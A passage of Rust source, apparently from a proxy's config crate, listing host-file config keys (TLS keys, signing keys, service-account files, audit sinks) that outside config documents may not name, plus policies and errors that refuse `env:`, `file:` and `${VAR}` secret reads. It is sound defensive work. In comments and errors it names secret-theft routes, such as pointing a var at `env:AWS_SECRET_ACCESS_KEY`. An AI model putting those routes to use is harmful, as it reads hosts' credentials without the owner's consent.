/// over, and parent-scoping them is what left two of the three
/// spellings uncovered.
///
/// **A binary this node executes.** `engines.<kind>.acquire.path` under
/// a `serve:` block is an explicit engine-binary override that "wins
/// over everything" (`crates/sbproxy-model-host/src/acquire.rs:100-103`)
/// and is spawned. It reaches the pipeline through
/// `origins.*.ai.providers[].serve`
/// (`crates/sbproxy-ai/src/provider.rs:161`), a path `origins` leaves
/// open to a config-authority bundle with no opt-out. Two more host
/// paths sit beside it in the same block: `serve.cache_dir`
/// (`crates/sbproxy-model-host/src/config.rs:752`), which the node
/// `create_dir_all`s and fills with engines, weights and a redb ledger
/// (`crates/sbproxy-ai/src/handler.rs:616-620`), and `catalog_file`
/// (`:744`), read from disk. `catalog_file` is scoped `Anywhere`
/// because the same name is `proxy.model_host.catalog_file` one block
/// over and parent-scoping it covered one of the two.
/// `lora_adapters[].source` (`:562`) joins them value-aware: an
/// `hf:Org/Repo` reference is a fetch, anything else is a directory
/// this node loads adapter weights out of.
///
/// **Extension code.** `extensions.bundles_dir` and
/// `extensions.sources[].path` both hand the extension loader a host
/// directory to load *code* out of
/// (`crates/sbproxy-config/src/extensions.rs:42,170`). The first is
/// scoped `Under("extensions")`, which is where it sits;
/// `ExtensionBundlesConfig` carries `#[serde(deny_unknown_fields)]`, so
/// the `extensions.bundles.bundles_dir` this entry used to name was a
/// shape `serde` rejects and the entry could not fire on any valid
/// config (WOR-2433 re-review round 3). The second is value-aware for
/// the reason [`bundle_source_path_is_a_host_path`] gives: under
/// `type: git` the path is inside the fetched repository, and that is
/// the spelling both of these remedies point at, so refusing it made
/// the remedies name a key this same entry refused (WOR-2433 re-review
/// round 4).
///
/// **Node identity and node state.** `tls_cert_file`, `tls_key_file`,
/// `cert_file`, `key_file`, `ca_file`, `client_ca_file`, `tls.cert`,
/// `tls.key`, `authority_dir`, `signing_key_file`,
/// `verifying_key_file`, `verifying_keys_file`, `signing_key.pem_file`,
/// `state_dir`, `state_path`, `store_dir`, `store.path`,
/// `model_host.store_path`, `model_host.catalog_file`,
/// `cache.directory`, `engines.*.path`,
/// `socket_path`, `tls_certificate_path`, `jwt_path`, `auth.path`,
/// `service_account_key_file.path`, `external_account_file.path` and
/// `backends.path`. The PEM triple is scoped `Anywhere` rather than
/// under `security`, because the same three names appear under
/// `proxy.config_authority.publish.tls`,
/// `proxy.key_management.cache.mesh.peer_tls` and
/// `proxy.l2_cache_settings.params`, and scoping them to one parent
/// covered one of four.
///
/// An authority bundle cannot reach most of these, because
/// [`crate::AUTHORITY_DENIED_PATHS`] denies `proxy.cluster`,
/// `proxy.model_host` and `proxy.config_authority`. It does **not**
/// deny `proxy.*` wholesale: the list is ten specific paths
/// (`crates/sbproxy-config/src/config_merge.rs:131-142`) matched segment
/// by segment (`is_denied_trail`, `:632-641`), so `proxy.tls_cert_file`
/// and `proxy.tls_key_file` are siblings of the denied `proxy.tls`
/// rather than children of it, and these entries are the only thing
/// refusing them on that path (WOR-2433 re-review round 3).
///
/// **Durable sinks and evidence.** `audit.path`, `audit.config_path`,
/// `audit.key_path`, `audit.admin_path` (the chained audit trail, so an
/// externally authored document could otherwise redirect the evidence
/// chain), `output.path` (the access log and every
/// `observability.log.sinks[]` output, which is request data),
/// `events.path`, `request_events.path`, `session_ledger.path`,
/// `usage_rollups.path`, `usage_sinks[].path`, `ledger.path`,
/// `queue.path`, `config_history.dir` (the last-known-good ring),
/// `revocation_store.path`, `cache_path`, `storage_path`,
/// `local_path`, `prompt_persistence_path` and `backend.path` (the
/// filesystem cache reserve). Each of these creates and writes the path
/// it is given.
///
/// **The shared embedded store's three subsystems** (WOR-2661).
/// `agent_registry.store_path`, `notifications.store_path` and
/// `request_events.watermark_store_path` are redb files the process
/// creates owner-only and writes; the notifier's holds live webhook
/// signing secrets, so an externally authored document choosing its
/// location chooses where those land.
/// `agent_registry.feed_path` and `agent_registry.key_directory_path`
/// are read rather than written, and they are the pair the whole
/// signature chain hangs off: the directory vouches for the keys that
/// sign the feed, so a document that names the directory names what the
/// signatures are checked against. `store_path` is scoped per parent
/// rather than `Anywhere` because `proxy.model_host` already uses that
/// exact name for its revision store; `key_management`'s store is
/// `proxy.key_management.store.path` and is covered by `Under("store")`,
/// so it is not a second reason.
///
/// **Trust anchors and sockets the process opens.** `acme.ca_root` is a
/// PEM read with `std::fs::read` at issuance, and refusing to fall back
/// to the system roots is the point of it
/// (`crates/sbproxy-tls/src/lib.rs:986-988`); it is the key that showed
/// a name-only sweep is exactly as wide as its marker list.
/// `levers[].endpoint` is value-aware: `unix://` is stripped to a
/// filesystem path and connected to
/// (`crates/sbproxy-ai/src/compression/config.rs:669`), while the
/// network form is an egress destination and a different boundary.
///
/// * `proxy.ai_providers_file` - `crates/sbproxy-config/src/types.rs:1905`,
///   read at boot by `crates/sbproxy-core/src/server/lifecycle.rs:1663`
/// * `proxy.federation.signing_key.pem_file` -
///   `crates/sbproxy-config/src/types.rs:2260`, read with `std::fs::read`
///   when the OpenID Federation pipeline is constructed
///   (`crates/sbproxy-core/src/pipeline.rs:2471`). It is the private key
///   this node signs entity statements with, so the document that names
///   it picks which key on the host speaks for this entity. Scoped
///   `Under("signing_key")` rather than `Anywhere` because
///   `proxy.federation.signing_key` is the only mapping that carries the
///   key; the other `signing_key` in the schema,
///   `origins.*.olp.signing_key`, is a leaf string with nothing under it.
///
/// A document that may name one of these can name any path the proxy
/// process can open, which is a host-file read, or write, handed to
/// whoever writes the document. The root config keeps the power because
/// the operator owns the filesystem.
///
/// This list is a list, not a rule, so it is exactly as wide as its
/// entries and no wider. There is deliberately no count ratchet over the
/// greps: the crates' own tests read files too, so a count would go red
/// on a new test rather than on a new host-file key, which is a guard
/// that trains people to bump a number. What the list cannot see is
/// stated in the module docs under "What this boundary does not stop",
/// every entry is pinned by name in
/// `a_document_naming_a_host_file_key_is_refused`, and the schema sweep
/// above is what notices a key nobody added.
///
/// Keys that take the *name* of an environment variable rather than a
/// path are deliberately absent; see the module docs for why.
const HOST_FILE_KEYS: &[HostFileKey] = &[
    // --- compiled by the pipeline -------------------------------------
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "rego_module_path",
        remedy: "carry the module inline under `rego_module`",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "module_path",
        remedy: "carry the module inline under `module` (a Rego policy) or under \
                 `module_bytes` (a wasm transform)",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "spec_file",
        remedy: "carry the OpenAPI document inline under `spec`",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "sha1_file",
        remedy: "carry the hashes inline under `sha1_hashes`",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("transcode"),
        key: "descriptor_set",
        remedy: "leave the descriptor set to the layer this node owns; it has no inline form",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("bulk_list"),
        key: "path",
        remedy: "carry the rows inline under `rows`, or serve the list over https with `url`",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("feed"),
        key: "cache_dir",
        remedy: "leave the cache location unset and take the subscriber's default",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("feed"),
        key: "cache_file",
        remedy: "leave the cache location unset and take the subscriber's default",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "spec_path",
        remedy: "carry the OpenAPI document inline under `spec`",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("argument_policies"),
        key: "path",
        remedy: "carry the policy source inline under `source`",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("result_policies"),
        key: "path",
        remedy: "carry the policy source inline under `source`",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("agent_skills"),
        key: "path",
        remedy: "carry the artifact inline under `body`",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("agent_skills"),
        key: "url",
        remedy: "give the entry an absolute `https://` url, or carry the artifact inline \
                 under `body`",
        host_path_value: Some(agent_skill_url_is_a_host_path),
    },
    HostFileKey {
        scope: KeyScope::Under("action"),
        key: "path",
        remedy: "serve the objects from a cloud backend (`s3`, `gcs`, `azure`)",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("tool_versioning"),
        key: "lockfile",
        remedy: "leave the lockfile path to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("grant_ledger"),
        key: "path",
        remedy: "leave the grant ledger file to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("approval"),
        key: "store",
        remedy: "leave the approval store file to the layer this node owns",
        host_path_value: None,
    },
    // --- model, tokenizer and rule-pack weights -----------------------
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "model_path",
        remedy: "leave the model file to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "tokenizer_path",
        remedy: "leave the tokenizer file to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "model_signature_path",
        remedy: "leave the detector's files to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "tokenizer_signature_path",
        remedy: "leave the detector's files to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "rule_pack_path",
        remedy: "leave the agent-detect rule pack to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "onnx_model_path",
        remedy: "leave the agent-detect model to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "database_path",
        remedy: "leave the GeoIP database to the layer this node owns",
        host_path_value: None,
    },
    // --- extension code -----------------------------------------------
    HostFileKey {
        scope: KeyScope::Under("extensions"),
        key: "bundles_dir",
        remedy: "declare the bundle as a `sources:` entry of `type: git`, pinned by \
                 `revision`, whose `path` is relative to the repository root, or leave \
                 the directory to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("sources"),
        key: "path",
        remedy: "declare the source as `type: git` with a pinned `revision` and a `path` \
                 relative to the repository root, or leave the directory to the layer this \
                 node owns",
        host_path_value: Some(bundle_source_path_is_a_host_path),
    },
    // --- node identity and node state ---------------------------------
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "tls_cert_file",
        remedy: "leave this node's certificate to the layer it owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "tls_key_file",
        remedy: "leave this node's key to the layer it owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "cert_file",
        remedy: "leave this node's certificate to the layer it owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "key_file",
        remedy: "leave this node's key to the layer it owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "ca_file",
        remedy: "leave the trust anchors to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "client_ca_file",
        remedy: "leave the client trust anchors to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("tls"),
        key: "cert",
        remedy: "leave the admin server's certificate to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("tls"),
        key: "key",
        remedy: "leave the admin server's key to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "authority_dir",
        remedy: "leave the enrollment authority directory to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "signing_key_file",
        remedy: "leave the signing key to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "verifying_key_file",
        remedy: "leave the verifying key to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "verifying_keys_file",
        remedy: "leave the trusted-key set to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("signing_key"),
        key: "pem_file",
        remedy: "leave this node's federation signing key to the layer it owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "state_dir",
        remedy: "leave this node's durable state directory to the layer it owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "state_path",
        remedy: "leave the payments database to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "store_dir",
        remedy: "leave the authority's bundle store to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("store"),
        key: "path",
        remedy: "leave the store path to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("model_host"),
        key: "store_path",
        remedy: "leave the revision store to the layer this node owns",
        host_path_value: None,
    },
    // --- WOR-2661: the subsystems on the shared embedded store --------
    HostFileKey {
        scope: KeyScope::Under("agent_registry"),
        key: "store_path",
        remedy: "leave the registry's store to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("agent_registry"),
        key: "feed_path",
        remedy: "leave the catalog feed to the layer this node owns; the registry reads \
                 it off the host filesystem and has no inline form",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("agent_registry"),
        key: "key_directory_path",
        remedy: "leave the key directory to the layer this node owns; naming it is naming \
                 what the feed's signatures are checked against",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("notifications"),
        key: "store_path",
        remedy: "leave the notifier's store to the layer this node owns; the file holds \
                 live webhook signing secrets",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("request_events"),
        key: "watermark_store_path",
        remedy: "leave the delivery checkpoint to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "catalog_file",
        remedy: "take the model catalog compiled into the binary, or leave the file to \
                 the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("serve"),
        key: "cache_dir",
        remedy: "leave the weight cache directory to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("acquire"),
        key: "path",
        remedy: "take `acquire.source: release` with a pinned `version` and `sha256`, or \
                 leave the engine binary to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("lora_adapters"),
        key: "source",
        remedy: "name the adapter as an `hf:Org/Repo` reference, or leave the adapter \
                 directory to the layer this node owns",
        host_path_value: Some(lora_adapter_source_is_a_host_path),
    },
    HostFileKey {
        scope: KeyScope::Under("cache"),
        key: "directory",
        remedy: "leave the model cache directory to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::UnderAnyChildOf("engines"),
        key: "path",
        remedy: "leave the engine binary path to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "socket_path",
        remedy: "leave the payment rail's socket to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "tls_certificate_path",
        remedy: "leave the payment rail's certificate to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "jwt_path",
        remedy: "leave the backend's credential files to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("auth"),
        key: "path",
        remedy: "leave the kubeconfig to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("service_account_key_file"),
        key: "path",
        remedy: "leave the service-account key to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("external_account_file"),
        key: "path",
        remedy: "leave the external-account file to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("backends"),
        key: "path",
        remedy: "name a backend the operator declared, rather than a secrets file on \
                 this host",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("proxy"),
        key: "ai_providers_file",
        remedy: "leave the provider catalog to the layer this node owns, or take the \
                 catalog compiled into the binary",
        host_path_value: None,
    },
    // --- durable sinks and evidence -----------------------------------
    HostFileKey {
        scope: KeyScope::Under("audit"),
        key: "path",
        remedy: "take the `memory` sink, or leave the chain file to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("audit"),
        key: "config_path",
        remedy: "leave the config-audit chain to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("audit"),
        key: "key_path",
        remedy: "leave the key-audit chain to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("audit"),
        key: "admin_path",
        remedy: "leave the admin-audit chain to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("output"),
        key: "path",
        remedy: "take a `stdout` or `stderr` output, or leave the file to the layer this \
                 node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("events"),
        key: "path",
        remedy: "take the `webhook` sink, or leave the file to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("request_events"),
        key: "path",
        remedy: "take the `logging` sink, or leave the file to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("session_ledger"),
        key: "path",
        remedy: "take the `logging` sink, or leave the file to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("usage_rollups"),
        key: "path",
        remedy: "leave the rollup database to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("usage_sinks"),
        key: "path",
        remedy: "send the events to a `webhook` sink, or leave the file path to the layer \
                 this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("ledger"),
        key: "path",
        remedy: "leave the attestation ledger to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("queue"),
        key: "path",
        remedy: "leave the attestation queue to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("config_history"),
        key: "dir",
        remedy: "leave the revision ring to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("revocation_store"),
        key: "path",
        remedy: "take the `memory` backend, or leave the store file to the layer this \
                 node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "cache_path",
        remedy: "leave the bundle cache to the layer this node owns",
        host_path_value: None,
    },
    // `proxy.acme.storage_path` is a filesystem directory under the
    // `redb`, `sqlite` and `file` backends and a bucket or key prefix
    // under `s3`, `gcs`, `azure` and `redis`. The discriminator is a
    // sibling named `storage_backend`, not the serde `type` tag, so
    // `HostPathTest` cannot reach it and this entry refuses every
    // backend's spelling. That is the fail-closed side, and it is
    // over-refusal on the cloud backends, which is why the remedy names
    // the operator's own layer rather than a different backend
    // (WOR-2433 re-review round 4).
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "storage_path",
        remedy: "leave the certificate store's location to the layer this node owns, \
                 whichever `storage_backend` it uses",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("acme"),
        key: "ca_root",
        remedy: "take the system trust roots by leaving this unset, or leave the PEM to \
                 the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("levers"),
        key: "endpoint",
        remedy: "address the classifier over the network with a `grpc://` or `http://` \
                 endpoint, or leave the socket to the layer this node owns",
        host_path_value: Some(compression_lever_endpoint_is_a_host_path),
    },
    HostFileKey {
        scope: KeyScope::Under("compression_state"),
        key: "local_path",
        remedy: "leave the compression-state database to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Anywhere,
        key: "prompt_persistence_path",
        remedy: "leave the prompt-store overlay to the layer this node owns",
        host_path_value: None,
    },
    HostFileKey {
        scope: KeyScope::Under("backend"),
        key: "path",
        remedy: "use the `memory` backend, or leave the reserve path to the layer this \
                 node owns",
        host_path_value: None,
    },
];

/// What an externally authored document may do inside the confined
/// boundary.
///
/// Four powers the root operator config keeps and this boundary hands
/// out one at a time, because the party that writes the document is not
/// the party that owns the host it compiles on:
///
/// * naming a process variable in a template form,
/// * using a secret reference that reads the host directly
///   (`env:NAME`, `vault://env/NAME`, `file:PATH`),
/// * naming a host path the proxy opens (the keys in `HOST_FILE_KEYS`),
/// * naming a secret backend the operator declared under
///   `proxy.secrets` (`secret://backend/key` and the other provider
///   URIs).
///
/// [`ConfinementPolicy::sealed`] grants the last only and is what a
/// fragment gets. [`ConfinementPolicy::remote_document`] grants the
/// first and the last, and is what a config authority's bundle gets,
/// along with a git-sourced document whose operator asked for it with
/// `source.confine: true`. [`ConfinementPolicy::bundle_manifest`] grants
/// none of them, because a bundle manifest's own text is the one input
/// here that no operator reviewed at all.
#[derive(Debug, Clone)]
pub struct ConfinementPolicy {
    /// `Some` means `{{vars.X}}` resolves against these bindings and an
    /// unbound name is an error. `None` means `{{ }}` is left exactly as
    /// authored, for a document whose variables are resolved later by
    /// the fleet-wide pass against the origin they land on.
    inputs: Option<HashMap<String, serde_json::Value>>,
    /// Whether the document may name a process variable through
    /// `${VAR}` or `{{env.X}}`.
    process_environment: bool,
    /// Whether the document may carry a host-backed secret reference.
    host_backed_secrets: bool,
    /// Whether the document may inline a host file by path.
    host_file_inlining: bool,
    /// Whether the document may name a secret backend the operator
    /// declared under `proxy.secrets`.
    declared_secret_backends: bool,
}

impl ConfinementPolicy {
    /// No process environment, no host-backed secret reference, no host
    /// file, and no variable the caller did not bind. What a fragment
    /// authored in another repository gets.
    ///
    /// A provider URI (`secret://backend/key`) is still allowed: it
    /// resolves only against a backend the operator declared under
    /// `proxy.secrets`, which is a path no externally authored document
    /// may set, so the operator still chooses what it can reach.
    #[must_use]
    pub fn sealed() -> Self {
        Self {
            inputs: Some(HashMap::new()),
            process_environment: false,
            host_backed_secrets: false,
            host_file_inlining: false,
            declared_secret_backends: true,
        }
    }

    /// [`Self::sealed`] plus the inputs the caller binds for
    /// `{{vars.X}}`.
    #[must_use]
    pub fn with_inputs(inputs: HashMap<String, serde_json::Value>) -> Self {
        Self {
            inputs: Some(inputs),
            ..Self::sealed()
        }
    }

    /// A whole document served by a config authority, or fetched from a
    /// git repository the operator marked `source.confine: true`:
    /// `${VAR}` keeps working, host-backed secret references and
    /// host-file inlining do not.
    ///
    /// The asymmetry is deliberate and each half has a reason.
    ///
    /// `${VAR}` stays because it is the documented and only supported
    /// way to run one shared document across a fleet: the document names
    /// the per-node values and each host exports them (see "Node
    /// identity in a shared repository" in docs/configuration.md).
    /// Sealing it would break every git-sourced fleet on upgrade, which
    /// is a breaking change wearing a default's clothes. Its residual
    /// risk is stated in the module docs rather than hidden.
    ///
    /// The other two go because the node owns its own environment,
    /// secret backends and filesystem, which is the same rule
    /// [`crate::AUTHORITY_DENIED_PATHS`] already applies at the path
    /// level (`proxy.secrets` is denied to an authority for exactly this
    /// reason). Sealing `env:`, `vault://env/` and `file:` applies it to
    /// values instead of paths, which is where a deny list of paths
    /// could not reach.
    ///
    /// A subscriber's own base config keeps all four powers, because the
    /// screen runs on the bundle rather than on the merge result, so the
    /// remedy the refusal offers - declare the value in the config the
    /// operator owns - is a remedy that exists on this path. A git
    /// `source:` block is the case where it does not, which is why that
    /// one is opt-in; see `docs/configuration.md`.
    #[must_use]
    pub fn remote_document() -> Self {
        Self {
            inputs: None,
            process_environment: true,
            host_backed_secrets: false,
            host_file_inlining: false,
            declared_secret_backends: true,
        }
    }

    /// A value a bundle manifest authored for itself: no secret
    /// reference of any kind resolves, and no template form does either.
    ///
    /// The strictest of the three, and the only one that also withholds
    /// the operator's declared backends. An extension bundle's config
    /// vars are handed to guest code that can read them and write them
    /// into a response, so a resolved secret in one is a secret the
    /// guest has. The manifest's `config_schema` defaults and its
    /// `secret_vars` list are both written by whoever authored the
    /// bundle, so a bundle that could point one of its own vars at
    /// `env:AWS_SECRET_ACCESS_KEY` or at `secret://prod/db-password`
    /// would read the host with no line of the operator's config naming
    /// the value. A value the *operator* wrote in the root config for
    /// that bundle still resolves, through the same code, because the
    /// operator is the party that owns those secrets (WOR-2433
    /// re-review).
    #[must_use]
    pub fn bundle_manifest() -> Self {
        Self {
            inputs: None,
            process_environment: false,
            host_backed_secrets: false,
            host_file_inlining: false,
            declared_secret_backends: false,
        }
    }
}

/// A confined fragment was refused. Every variant names the fragment and
/// the field path, and none of them carries a value read from the
/// process environment, because the confined pass reads none.
#[derive(Debug, thiserror::Error)]
pub enum ConfinedTemplateError {
    /// The fragment is not YAML.
    #[error("config fragment `{fragment}` does not parse as YAML: {source}")]
    Parse {
        /// Caller-supplied label for the fragment, for the operator.
        fragment: String,
        /// The parse failure.
        #[source]
        source: serde_yaml::Error,
    },
    /// The fragment carries a custom YAML tag.
    ///
    /// Tags are silently stripped by the parser, keeping the bare
    /// scalar, so `password: !env ADMIN_PASSWORD` becomes the literal
    /// string `ADMIN_PASSWORD`. Refused at the fragment boundary so the
    /// error names the fragment rather than a path in a composed
    /// document nobody wrote by hand.
    #[error(
        "config fragment `{fragment}` carries the unsupported YAML tag `{tag}` at `{path}`. \
         Tags are stripped by the parser, so the value would be the literal text after the \
         tag. A fragment parameterizes itself with `{{{{vars.NAME}}}}` inputs its caller \
         binds; see the `Confined fragments` section of docs/configuration.md."
    )]
    YamlTag {
        /// Caller-supplied label for the fragment, for the operator.
        fragment: String,
        /// Dotted path to the tagged node.
        path: String,
        /// The tag as authored, e.g. `!env`.
        tag: String,
    },
    /// The fragment references a process environment variable with
    /// `${VAR}`.
    #[error(
        "config fragment `{fragment}` references the process environment variable \
         `{variable}` at `{path}`. A fragment resolves only the inputs its caller binds, so \
         this is refused rather than read: an externally authored fragment that could name \
         a variable could read every credential in the aggregator's environment. Declare it \
         as a `{{{{vars.NAME}}}}` input and let the operator bind it, or write \
         `{variable_escaped}` to keep the literal text. See the `Confined fragments` \
         section of docs/configuration.md."
    )]
    EnvReference {
        /// Caller-supplied label for the fragment, for the operator.
        fragment: String,
        /// Dotted path to the offending field, suffixed with
        /// `(mapping key)` when the placeholder sits in a mapping key
        /// rather than in a value.
        path: String,
        /// The variable name, with any `:-default` tail removed. The
        /// variable's *value* is deliberately absent: nothing here ever
        /// reads it.
        variable: String,
        /// The placeholder rendered with the `$$` escape, ready to paste.
        variable_escaped: String,
    },
    /// The fragment references a process environment variable with
    /// `{{env.X}}`.
    #[error(
        "config fragment `{fragment}` references the process environment variable \
         `{variable}` at `{path}` as `{{{{env.{variable}}}}}`. A fragment resolves only the \
         inputs its caller binds. Declare it as a `{{{{vars.NAME}}}}` input and let the \
         operator bind it. See the `Confined fragments` section of docs/configuration.md."
    )]
    EnvTemplate {
        /// Caller-supplied label for the fragment, for the operator.
        fragment: String,
        /// Dotted path to the offending field.
        path: String,
        /// The variable name. Its value is deliberately absent.
        variable: String,
    },
    /// The fragment references an input its caller did not bind.
    ///
    /// A named error rather than a warning or a literal passthrough: a
    /// fragment reading a variable it never declared as an input is the
    /// same defect as reading the environment, at a smaller radius.
    #[error(
        "config fragment `{fragment}` references the input `{variable}` at `{path}`, which \
         its caller did not bind. Bound inputs: {bound}. A fragment may read only the inputs \
         it was given; see the `Confined fragments` section of docs/configuration.md."
    )]
    UnboundInput {
        /// Caller-supplied label for the fragment, for the operator.
        fragment: String,
        /// Dotted path to the offending field.
        path: String,
        /// The input name the fragment asked for.
        variable: String,
        /// The bound input **names**, sorted, comma separated, or
        /// `(none)`. Names only: a binding value can be a credential.
        bound: String,
    },
    /// The document carries a secret reference that reads the host
    /// directly rather than a backend the operator declared.
    ///
    /// `env:NAME` and the legacy `vault://env/NAME` alias carry no
    /// template syntax at all, so the template scan cannot see them;
    /// they are the same environment read spelled a different way, and
    /// `file:PATH` is the filesystem equivalent.
    #[error(
        "externally authored config `{fragment}` sets `{path}` to a `{form}` secret \
         reference, which resolves from {reads} on whichever machine compiles the \
         document. The party that writes this document is not the party that owns that \
         host, so the reference is refused rather than resolved: without this, a write to \
         this document would be a read of the compiling host's credentials. Declare the \
         value in the config the operator owns, or name a backend the operator declared \
         under `proxy.secrets`. See the `Confined fragments` section of \
         docs/configuration.md."
    )]
    HostSecretReference {
        /// Caller-supplied label for the document, for the operator.
        fragment: String,
        /// Dotted path to the offending field.
        path: String,
        /// The reference spelling, e.g. `env:NAME`. Never the value, and
        /// never the variable or path the reference names: the name is
        /// enough of a pointer for the author, who wrote it.
        form: &'static str,
        /// What that spelling reads, e.g. `the process environment`.
        reads: &'static str,
    },
    /// The document names a host filesystem path the proxy would open.
    #[error(
        "externally authored config `{fragment}` sets `{path}`, which the proxy opens on the \
         host filesystem while it builds the pipeline. A document authored somewhere other \
         than the host it runs on may not name a path on that host: the file belongs to \
         whoever runs the proxy. Instead, {remedy}. The layer this node owns keeps the \
         power: the local document on a config-authority node, or the pointer file through \
         `source:` `kind: git_overlay` over a `kind: local` base on a git-sourced one. See \
         the `Confined fragments` section of docs/configuration.md."
    )]
    HostFileInlining {
        /// Caller-supplied label for the document, for the operator.
        fragment: String,
        /// Dotted path to the offending key.
        path: String,
        /// What the operator does instead, named after a key that
        /// exists on the module this key belongs to.
        remedy: &'static str,
    },
    /// The document wrote a `${VAR:-default}` whose *default* reaches
    /// for this host.
    ///
    /// A bare `${VAR}` names bytes the node supplies, which is the
    /// spelling [`ConfinementPolicy::remote_document`] keeps. A `:-`
    /// default is bytes the document wrote, and the pre-parse pass makes
    /// them the value whenever the variable is unset or empty
    /// ([`crate::compiler::interpolate_env_vars`]), so a default is a
    /// literal wearing a placeholder's clothes. Refused for the two
